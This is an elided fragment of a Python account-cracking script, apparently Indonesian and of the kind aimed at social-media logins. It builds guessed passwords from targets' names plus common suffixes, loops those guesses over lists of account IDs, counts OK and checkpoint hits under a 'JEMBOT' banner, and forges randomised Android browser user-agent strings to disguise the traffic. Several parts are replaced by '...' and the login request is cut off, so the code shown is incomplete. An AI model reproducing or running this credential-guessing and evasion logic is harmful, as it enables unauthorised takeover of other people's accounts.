				...
				if len(depan)<=1 or len(depan)<=2:
					try:
						...
						if len(tengah)<=3:
							...
							pwx.append(tengah+"@123")
							pwx.append(tengah+"21")
							pwx.append(tengah+"01")
							pwx.append(tengah+"02")
							pwx.append(tengah+"03")
							pwx.append(nama)
					except:
						try:
...
def crack(idf,pwx,url,awal):
	...
	print(f"\r [{hh}JEMBOT{P}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua= "Mozilla/5.0 (Linux; Android {str(rr(8,12))}; SM-S908N Build/SP1A.{str(rr(11111,99999))}.016; ko-kr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36 Puffin/9.2.0.{str(rr(11111,99999))}AP"
